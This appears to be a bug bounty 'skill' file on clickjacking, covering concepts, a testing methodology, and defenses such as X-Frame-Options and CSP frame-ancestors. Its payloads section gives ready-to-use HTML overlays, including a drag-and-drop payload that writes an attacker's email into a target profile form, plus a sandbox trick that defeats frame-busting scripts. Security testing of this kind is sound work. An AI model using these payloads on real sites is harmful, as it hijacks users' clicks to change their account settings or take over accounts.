---
name: "clickjacking-testing"
version: "2.0"
category: "logic"
subcategory: "clickjacking"
phase: "exploitation"
tags: ["bug-bounty", "logic", "clickjacking", "ui-redress", "csp", "x-frame-options"]
tools: ["burp-suite", "browser"]
follow_up_skills: ["xss-exploitation", "csrf-testing", "xss", "csrf", "phishing"]
description: "Bug bounty skill: clickjacking testing - exploitation phase, logic category"
---
# Clickjacking

## Summary

Clickjacking tricks users into clicking a page element that is invisible or disguised as something else. Consequences include malware downloads, credential theft, unintended转账, or triggering XSS. Defenses include `X-Frame-Options`, CSP `frame-ancestors`, and frame-busting scripts.

## Key Concepts

- **Clickjacking**: User is deceived into clicking an invisible or disguised element on a webpage
- **Pre-filled form technique**: GET parameters pre-fill form fields; attacker abuses this to populate arbitrary data and tricks user into submitting
- **Drag-and-drop form filling**: User drags content that writes attacker-controlled data into a form field
- **XSS + Clickjacking chaining**: If a self-XSS page is clickjackable with pre-filled parameters, attacker can chain both
- **Frame-busting scripts**: JavaScript that prevents the page from being loaded in frames
- **Sandbox bypass**: HTML5 iframe `sandbox` attribute can neutralize frame-busting scripts by omitting `allow-top-navigation`
- **Like-jacking**: Users unknowingly "Like" a page thinking they're pressing a different button
- **Permission Hijacking**: Users tricked into clicking "Allow" on browser permission prompts (camera, location, notifications)

### OWASP Classification

Clickjacking falls under **OWASP A05:2021 – Security Misconfiguration**. OWASP also provides a dedicated Clickjacking Defense Cheat Sheet.

## Technical Details

### Pre-filled Form Technique

Attackers abuse GET parameters to pre-fill form fields with arbitrary values, then trick the user into clicking the submit button.

### Drag-and-Drop Form Filling

User is asked to drag content that writes attacker-controlled data (e.g., email) into form fields they would not normally fill.

### XSS + Clickjacking Chaining

If a self-XSS page (only the user can set and execute) is clickjackable and can be pre-filled via GET params, the attacker can craft a clickjacking page that pre-fills the XSS payload and tricks the user into submitting it.

### Real-World Examples

- **Facebook Like-jacking**: Users unknowingly "Like" a page thinking they're pressing a different button on a decoy overlay.
- **Permission Hijacking**: Users are tricked into clicking "Allow" on browser permission prompts (camera, location, notifications) via transparent iframes overlaying decoy UI.
- **Account Settings Manipulation**: Changing a victim's security settings (e.g., 2FA phone number, email) by aligning decoy elements over the hidden iframe's submit buttons.

### Frame-Busting Script Bypass

Attackers can neutralize frame-busting scripts using the iframe `sandbox` attribute with `allow-forms` and `allow-scripts` but **without** `allow-top-navigation`:

```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```

## Methodology

### Basic Clickjacking

1. Identify a page that performs a sensitive action (email change, transfer, etc.)
2. Check if the page lacks `X-Frame-Options` or CSP `frame-ancestors`
3. Create an HTML page with an invisible/transparent iframe pointing to the target
4. Overlay a decoy UI element aligned with the target button
5. Lure the victim to click the decoy

### Multi-Step Clickjacking

1. Identify a multi-step flow (e.g., confirmation dialog)
2. Align multiple decoy elements over each step's button
3. Use `opacity: 0.1` on the iframe to make it barely visible for debugging, then set to 0

### Drag-and-Drop Clickjacking

1. Find a profile/settings page that is clickjackable
2. Create a draggable element with the target value (e.g., `attacker@gmail.com`)
3. Align the drop target over the form field
4. User drags the element → fills the field → clicks submit

### Quick Test

Create a simple HTML file with an iframe pointing to the target:

```html
<iframe src="https://yoursite.com" width="800" height="600" style="opacity:0.1; position:absolute; top:0; left:0;"></iframe>
```

- If the site loads in the iframe → likely vulnerable to clickjacking
- If blank or blocked → protected

## Payloads

### Basic Payload

```html
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

### Multi-Step Payload

```html
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

### Drag-and-Drop + Click Payload

```html
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```

## Commands

No specific commands — this is an HTML/CSS/JS client-side attack.

## Tools

No specific tools — standard browser and text editor suffice.

## Bypass Techniques

### Frame-Busting Script Bypass

Use iframe `sandbox` attribute without `allow-top-navigation`:

```html
<iframe src="https://victim.com" sandbox="allow-forms allow-scripts"></iframe>
```

This prevents the framed page's JavaScript from navigating the top window.

## Defenses

### Client-Side

- **Frame-busting scripts**: `if (top !== self) { top.location = self.location; }`
- Can be bypassed via `sandbox` attribute (omit `allow-top-navigation`)

### Server-Side

#### X-Frame-Options Header

| Directive | Behavior |
|---|---|
| `X-Frame-Options: deny` | No domain can embed the page |
| `X-Frame-Options: sameorigin` | Only same origin can embed |
| `X-Frame-Options: allow-from https://trusted.com` | Only specified URI can embed |

Note: Limited browser support. CSP is recommended over this.

#### CSP frame-ancestors Directive

| Directive | Equivalent |
|---|---|
| `frame-ancestors 'none'` | `X-Frame-Options: deny` |
| `frame-ancestors 'self'` | `X-Frame-Options: sameorigin` |
| `frame-ancestors trusted.com` | `X-Frame-Options: allow-from` |

Example:
```
Content-Security-Policy: frame-ancestors 'self';
```

#### CSP frame-src Directive

Controls which sources can be loaded as frames:
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```

#### CSP child-src Directive

Fallback for `frame-src` (deprecated in favor of `frame-src` and `worker-src`):
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```

### Anti-CSRF Tokens

Use anti-CSRF tokens to ensure state-changing requests are intentional, not from a clickjacked page.

## Notes

- `X-Frame-Options` has limited browser support; CSP `frame-ancestors` is the recommended modern defense
- `child-src` is being deprecated in favor of `frame-src` and `worker-src`
- If `frame-src` is absent, `child-src` is used as fallback for frames; if both are absent, `default-src` is used
- Clickjacking is often chained with other vulnerabilities (XSS, CSRF, account takeover) for greater impact

## References

- https://hacktricks.xsx.tw/pentesting-web/clickjacking
- https://portswigger.net/web-security/clickjacking
- https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors
